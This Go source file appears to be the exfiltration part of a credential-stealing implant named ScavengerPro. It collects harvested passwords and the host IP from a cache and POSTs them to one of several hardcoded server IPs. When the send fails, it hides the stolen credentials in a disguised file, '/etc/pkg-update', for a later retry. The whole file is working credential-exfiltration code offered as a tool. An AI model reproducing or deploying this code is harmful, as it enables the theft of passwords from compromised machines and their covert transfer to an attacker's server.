// ship the credential cache to the server
// @author: degenerat3

package main

import (
	"ScavengerPro/client/cred_cache"
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
)

var serv = getServer() //IP of server

// pick an IP from the list
func getServer() string {
	servs := make([]string, 0)
	servs = append(servs,
		"1.1.1.1",
		"2.2.2.2",
		"3.3.3.3",
	)
	selection := servs[rand.Intn(len(servs))]
	return string(selection)
}

// This function will extract info from CredCache object and ship it back
// to the web server.  If the POST request fails, write the cache data to
// a file in temp, so it can be shipped later
func sendData(c *cred_cache.CredCache) {
	path := "/etc/pkg-update" // path to write data to if sending fails
	ip := c.GetIP()
	creds := c.GetEntries()
	previousDump := fetchDump(path)
	if previousDump != nil { // read any creds we missed from the old dump
		for _, c := range previousDump {
			tmp := stringInSlice(c, creds)
			if tmp != true {
				creds = append(creds, c)
			}
		}
		os.Remove("/etc/pkg-update")
	}
	credStr := ""
	for _, cd := range creds {
		credStr += cd + "\n"
	}
	url := "http://" + serv + "/scavpro" //turn ip into URL
	fmt.Println(url)
	jsonData := map[string]string{"IP": ip, "credentials": credStr}
	jsonValue, _ := json.Marshal(jsonData)                                   // what are you silly?
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue)) // send it!
	if err != nil {
		fmt.Println("send failed") // if error with sending, write cache to disk
		path := "/etc/pkg-update"
		dumpCache(creds, path)
		return
	}
	c.ClearEntries() // reset cred entries in cache
	return

}

// This function writes the credentials from a cred_cache object to
// a specified file path
func dumpCache(creds []string, path string) {
	cstr := ""
	for _, cred := range creds {
		cstr += cred + "\n" // make into a looong string
	}
	cbytes := []byte(cstr)               // make it bytes
	ioutil.WriteFile(path, cbytes, 0644) // write it
	return
}

// This function reads the credential dump from specified path and returns
// it as a []string
func fetchDump(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil // nil if there's no credential dump written to disk
	}
	defer f.Close()
	var data []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() { // read the cred dump into a []string
		data = append(data, scanner.Text())
	}

	return data
}

// return true if a string exists in a slice
func stringInSlice(a string, slc []string) bool {
	for _, b := range slc {
		if b == a {
			return true
		}
	}
	return false
}

// This function will be called by other programs, checks to see if we have
// enough entries to bother shipping them
func shipIt(c *cred_cache.CredCache, min int) {
	if c.CountEntries() < min {
		return // not enough passwords to ship
	}
	sendData(c)
	return
}
